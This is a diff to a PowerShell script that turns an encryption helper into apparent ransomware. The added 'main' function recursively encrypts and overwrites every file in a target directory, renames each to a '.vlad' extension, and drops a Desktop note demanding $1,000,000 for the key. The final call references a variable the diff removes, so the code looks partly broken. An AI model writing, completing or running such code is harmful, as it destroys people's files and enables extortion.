@@ -57,7 +57,6 @@ function Decrypt-String {
     param(
         [Parameter(Mandatory=$true)]
         [string]$EncryptedString,
-        
         [Parameter(Mandatory=$true)]
         [string]$EncryptionKey
     )
@@ -104,15 +103,39 @@ function Decrypt-String {
         return $null
     }
 }
+# Function to call file encryption and overwrite old file
+
+
+function main{
+    param (
+        [Parameter(Mandatory=$true)]
+        [string] $TargetDirectory,
+        [Parameter(Mandatory=$true)]
+        [string] $EncKey
+    )
+    $Target = [System.IO.Directory]::EnumerateFiles($TargetDirectory,"*",[System.IO.SearchOption]::AllDirectories)
+    foreach($file in $Target){
+        $FileString = Get-Content $file -Raw
+        $EncFileData=Encrypt-String -InputString $FileString -EncryptionKey $EncKey
+        [System.IO.File]::WriteAllText($file,$EncFileData)
+        $NewFileName=[System.IO.Path]::ChangeExtension($file,".vlad")
+        Rename-Item -Path $file -NewName $NewFileName
+    }
+    try {
+        New-Item -Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File
+        Set-Content -Path "$env:USERPROFILE\Desktop\GetGot.txt" -Value 'You got got! We have encrypted the contents of all your files! Good luck finding the key....I may be enticed to give it to you for a small fee...OF $1,000,000'
+    }
+    catch {
+        Set-Content -Path "$env:USERPROFILE\Desktop\GetGot.txt" -Value 'You got got! We have encrypted the contents of all your files! Good luck finding the key....I may be enticed to give it to you for a small fee...OF $1,000,000'
+    }
+    
+}
 
 
 
-$path = "C:\Users\Vadim\Desktop\Test\TestTest.txt.txt"
-$string = (Get-Content $path -Raw)
-$Data = [System.Text.Encoding]::UTF8.GetBytes($string)
 
 # Example usage:
-$encrypted = Encrypt-String -InputString $string -EncryptionKey "MySecretKey123"
-$decrypted = Decrypt-String -EncryptedString $encrypted -EncryptionKey "MySecretKey123"
+#$encrypted = Encrypt-String -InputString $string -EncryptionKey "MySecretKey123"
+#$decrypted = Decrypt-String -EncryptedString $encrypted -EncryptionKey "MySecretKey123"
 
-Write-Host $decrypted
+Write-host (main -TargetDirectory $path)
